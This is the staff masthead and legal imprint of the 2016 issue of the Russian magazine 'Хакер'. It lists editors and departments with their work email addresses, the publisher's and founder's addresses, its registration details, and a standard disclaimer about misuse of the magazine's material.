        Илья Русанен           Павел Круглов
           КОДИНГ              UNIXOID и SYN/ACK
           rusanen@glc.ru                kruglov@glc.ru


                        MEGANEWS
                             Мария Нефёдова
                                  nefedova.maria@gameland.ru



                                АРТ
                   Анна Королькова          Depositphotos.com
                        Верстальщик             Источник лицензионных
                     цифровой версии             фото и графики


                           РЕКЛАМА
                                 Анна Яковлева
                                   Директор по рекламе
                                          yakovleva.a@glc.ru


                 РАСПРОСТРАНЕНИЕ И ПОДПИСКА
                     Подробная информация по подписке: paywall@glc.ru
                                 Отдел распространения
                                Наталья Алехина (lapina@glc.ru)
                          Адрес для писем: Москва, 109147, а/я 50




В случае возникновения вопросов по качеству печати: claim@glc.ru. Адрес редакции: 115280, Москва, ул. Ленинская Слобода, д. 19, Омега плаза. Изда-
тель: ООО «Эрсиа»: 606400, Нижегородская обл., Балахнинский р-н, г. Балахна, Советская пл., д. 13. Учредитель: ООО «Принтер Эдишионс», 614111,
Пермский край, г. Пермь, ул. Яблочкова, д. 26. Зарегистрировано в Федеральной службе по надзору в сфере связи, информационных технологий и массо-
вых коммуникаций (Роскомнадзоре), свидетельство ПИ № ФС77-56756 от 29.01.2014 года. Мнение редакции не обязательно совпадает с мнением авто-
ров. Все материалы в номере предоставляются как информация к размышлению. Лица, использующие данную информацию в противозаконных целях,
могут быть привлечены к ответственности. Редакция не несет ответственности за содержание рекламных объявлений в номере. По вопросам лицензи-
рования и получения прав на использование редакционных материалов журнала обращайтесь по адресу: xakep@glc.ru. © Журнал «Хакер», РФ, 2016